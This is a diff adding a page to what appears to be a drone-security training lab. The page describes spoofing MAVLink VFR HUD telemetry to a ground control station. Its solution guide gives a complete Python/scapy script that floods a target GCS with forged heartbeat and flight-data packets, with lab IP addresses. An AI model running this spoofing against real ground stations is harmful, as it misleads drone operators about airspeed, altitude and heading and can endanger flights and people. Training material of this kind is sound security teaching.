@@ -1,0 +1,123 @@
+title: VFR HUD Spoofing
+order: 7
+description: Spoofing the VFR HUD (Vertical Flight Reference Heads-Up Display) data to mislead the Ground Control Station (GCS) about the drone's flight status.
+breadcrumb:
+  - text: Attack Scenarios
+    link: /attacks
+  - text: Reconnaissance
+  - text: VFR HUD Spoofing
+
+sections:
+  - title: Description
+    content: |
+      VFR HUD spoofing involves sending false VFR HUD data (airspeed, ground speed, altitude, 
+      climb rate, heading, and throttle) to the Ground Control Station (GCS) to mislead it about 
+      the drone's actual flight status. This can cause the operator to make incorrect decisions 
+      based on the spoofed data.
+
+  - title: Resources
+    content:
+      - text: MAVLink Protocol
+        link: https://mavlink.io/en/
+      - text: PyMAVLink Documentation
+        link: https://www.ardusub.com/developers/pymavlink.html
+
+  - title: Solution Guide
+    collapsible: true
+    steps:
+      - title: Step 1. Setup
+        description: |
+          Ensure you have Python and the necessary libraries installed:
+          ```sudo apt-get update
+          sudo apt-get install python3 python3-pip
+          pip3 install pymavlink scapy
+          ```
+
+      - title: Step 2. Create the Script
+        description: |
+          Create a Python script named `vfr-hud-spoofing.py` and paste the following code:
+          ```from pymavlink import mavutil
+          from scapy.all import *
+          import time
+          import sys
+          import random
+
+          def create_heartbeat():
+              """
+              Create a MAVLink heartbeat message.
+              """
+              mav = mavutil.mavlink.MAVLink(None)
+              mav.srcSystem = 1
+              mav.srcComponent = 1
+
+              heartbeat = mav.heartbeat_encode(
+                  type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
+                  autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
+                  base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
+                  custom_mode=3,  # Custom mode to indicate flying (ArduCopter: GUIDED mode)
+                  system_status=mavutil.mavlink.MAV_STATE_ACTIVE
+              )
+              
+              return heartbeat.pack(mav)
+
+          def create_vfr_hud():
+              """
+              Create a MAVLink VFR_HUD message with random values.
+              """
+              mav = mavutil.mavlink.MAVLink(None)
+              mav.srcSystem = 1
+              mav.srcComponent = 1
+
+              airspeed = random.uniform(0, 20)
+              groundspeed = random.uniform(0, 20)
+              heading = random.randint(0, 360)
+              altitude = random.uniform(0, 100)
+              climb = random.uniform(-5, 5)
+
+              vfr_hud = mav.vfr_hud_encode(
+                  airspeed=airspeed,
+                  groundspeed=groundspeed,
+                  heading=heading,
+                  throttle=0,
+                  alt=altitude,
+                  climb=climb
+              )
+              return vfr_hud.pack(mav)
+
+          def send_mavlink_packet(packet_data, target_ip, target_port):
+              """
+              Send a MAVLink packet using Scapy.
+              """
+              packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
+              send(packet)
+
+          if __name__ == "__main__":
+              if len(sys.argv) != 2:
+                  print("Usage: python vfr-hud-spoof.py <ip:port>")
+                  sys.exit(1)
+
+              target = sys.argv[1]
+              target_ip, target_port = target.split(':')
+              target_port = int(target_port)
+
+              while True:
+                  heartbeat_packet = create_heartbeat()
+                  vfr_hud_packet = create_vfr_hud()
+
+                  send_mavlink_packet(heartbeat_packet, target_ip, target_port)
+                  send_mavlink_packet(vfr_hud_packet, target_ip, target_port)
+                  
+                  print(f"Sent heartbeat and VFR_HUD packets to {target_ip}:{target_port}")
+
+          ```
+
+      - title: Step 3. Run the Script
+        description: |
+          Execute the script with sudo and the target GCS IP and port:
+          ```sudo python vfr-hud-spoofing.py <ip:port>
+          ```
+          Replace `<ip:port>` with the actual IP address and port of the QGroundControl App using `10.13.0.6:14550` or the GCS (MAVProxy) using `192.168.13.14:14550`/`10.13.0.4:14550`
+
+      - title: Step 4. Monitor the Effects
+        description: |
+          Observe the GCS to see the spoofed VFR HUD data being displayed. The drone's flight status (airspeed, ground speed, altitude, climb rate, heading, and throttle) will appear different from its actual state.
